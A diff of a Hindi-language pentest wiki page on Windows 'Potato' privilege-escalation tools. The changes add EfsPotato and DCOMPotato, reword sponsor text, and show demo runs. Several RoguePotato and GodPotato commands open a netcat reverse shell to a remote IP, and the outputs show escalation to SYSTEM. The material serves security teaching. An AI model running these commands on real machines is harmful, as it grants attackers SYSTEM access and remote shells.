@@ -19,18 +19,18 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** द्वारा संचालित सर्च इंजन है जो **मुफ्त** कार्यक्षमताएँ प्रदान करता है ताकि यह जांचा जा सके कि कोई कंपनी या उसके ग्राहक **संपर्कित** हुए हैं या नहीं **चोरी करने वाले मालवेयर** द्वारा।
+[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** द्वारा संचालित सर्च इंजन है जो **मुफ्त** कार्यक्षमताएँ प्रदान करता है ताकि यह जांचा जा सके कि क्या कोई कंपनी या उसके ग्राहक **समझौता** किए गए हैं **चोरी करने वाले मालवेयर** द्वारा।
 
-WhiteIntel का प्राथमिक लक्ष्य खाता अधिग्रहण और रैंसमवेयर हमलों से लड़ना है जो जानकारी-चोरी करने वाले मालवेयर के परिणामस्वरूप होते हैं।
+WhiteIntel का प्राथमिक लक्ष्य जानकारी-चोरी करने वाले मालवेयर के परिणामस्वरूप खाता अधिग्रहण और रैनसमवेयर हमलों से लड़ना है।
 
-आप उनकी वेबसाइट पर जा सकते हैं और **मुफ्त** में उनके इंजन का प्रयास कर सकते हैं:
+आप उनकी वेबसाइट पर जा सकते हैं और उनके इंजन को **मुफ्त** में आजमा सकते हैं:
 
 {% embed url="https://whiteintel.io" %}
 
 ***
 
 {% hint style="warning" %}
-**JuicyPotato Windows Server 2019 और Windows 10 बिल्ड 1809 से आगे काम नहीं करता**। हालाँकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) का उपयोग **समान विशेषाधिकारों का लाभ उठाने और `NT AUTHORITY\SYSTEM`** स्तर की पहुंच प्राप्त करने के लिए किया जा सकता है। यह [ब्लॉग पोस्ट](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` टूल पर गहराई से जाती है, जिसका उपयोग Windows 10 और Server 2019 होस्ट पर अनुकरण विशेषाधिकारों का दुरुपयोग करने के लिए किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।
+**JuicyPotato Windows Server 2019 और Windows 10 बिल्ड 1809 से आगे काम नहीं करता**। हालाँकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग **समान विशेषाधिकारों का लाभ उठाने और `NT AUTHORITY\SYSTEM`** स्तर की पहुंच प्राप्त करने के लिए किया जा सकता है। यह [ब्लॉग पोस्ट](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` टूल पर गहराई से जाती है, जिसका उपयोग Windows 10 और Server 2019 होस्ट पर अनुकरण विशेषाधिकारों का दुरुपयोग करने के लिए किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।
 {% endhint %}
 
 ## Quick Demo
@@ -61,8 +61,8 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f
 {% endcode %}
 
 ### SharpEfsPotato
-```
-SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+```bash
+> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 SharpEfsPotato by @bugch3ck
 Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
 
@@ -79,11 +79,34 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 C:\temp>type C:\temp\w.log
 nt authority\system
 ```
+### EfsPotato
+```bash
+> EfsPotato.exe "whoami"
+Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
+
+[+] Current user: NT Service\MSSQLSERVER
+[+] Pipe: \pipe\lsarpc
+[!] binding ok (handle=aeee30)
+[+] Get Token: 888
+[!] process with pid: 3696 created.
+==============================
+[x] EfsRpcEncryptFileSrv failed: 1818
+
+nt authority\system
+```
 ### GodPotato
+```bash
+> GodPotato -cmd "cmd /c whoami"
+# You can achieve a reverse shell like this.
+> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-GodPotato -cmd "cmd /c whoami"
-GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
-```
+### DCOMPotato
+
+![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
+
+
 ## References
 
 * [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
@@ -91,14 +114,16 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+* [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+* [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 
 ### [WhiteIntel](https://whiteintel.io)
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** द्वारा संचालित सर्च इंजन है जो यह जांचने के लिए **फ्री** कार्यक्षमताएँ प्रदान करता है कि क्या कोई कंपनी या उसके ग्राहक **स्टीलर मालवेयर** द्वारा **समझौता** किए गए हैं।
+[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** द्वारा संचालित सर्च इंजन है जो **फ्री** कार्यक्षमताएँ प्रदान करता है ताकि यह जांचा जा सके कि क्या कोई कंपनी या उसके ग्राहक **संपर्कित** हुए हैं **चोरी करने वाले मालवेयर** द्वारा।
 
-WhiteIntel का प्राथमिक लक्ष्य जानकारी-चोरी करने वाले मालवेयर के परिणामस्वरूप अकाउंट टेकओवर और रैनसमवेयर हमलों से लड़ना है।
+WhiteIntel का प्राथमिक लक्ष्य जानकारी-चोरी करने वाले मालवेयर के परिणामस्वरूप खाता अधिग्रहण और रैनसमवेयर हमलों से लड़ना है।
 
 आप उनकी वेबसाइट पर जा सकते हैं और **फ्री** में उनके इंजन का प्रयास कर सकते हैं:
 
